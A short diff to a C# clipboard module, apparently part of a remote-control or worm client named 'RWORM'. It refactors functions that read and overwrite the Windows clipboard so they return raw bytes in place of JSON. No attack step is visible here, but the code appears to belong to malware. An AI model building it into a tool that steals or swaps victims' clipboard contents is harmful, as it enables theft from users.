@@ -1,6 +1,6 @@
 using System;
 using System.Runtime.InteropServices;
-using System.Text.Json;
+using System.Text;
 using System.Threading;
 
 namespace RWORM.Client.Modules
@@ -68,7 +68,7 @@ namespace RWORM.Client.Modules
             t.Start();
             t.Join(2000);
 
-            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { text }));
+            return Encoding.UTF8.GetBytes(text);
         }
 
         public static byte[] SetClipboardText(string newText)
@@ -81,7 +81,7 @@ namespace RWORM.Client.Modules
                     if (OpenClipboard(IntPtr.Zero))
                     {
                         EmptyClipboard();
-                        byte[] bytes = System.Text.Encoding.Unicode.GetBytes(newText + "\0");
+                        byte[] bytes = Encoding.Unicode.GetBytes(newText + "\0");
                         IntPtr hMem = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)bytes.Length);
                         if (hMem != IntPtr.Zero)
                         {
@@ -103,7 +103,7 @@ namespace RWORM.Client.Modules
             t.Start();
             t.Join(2000);
 
-            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { ok }));
+            return Encoding.UTF8.GetBytes(ok ? "{\"ok\":true}" : "{\"ok\":false}");
         }
     }
 }
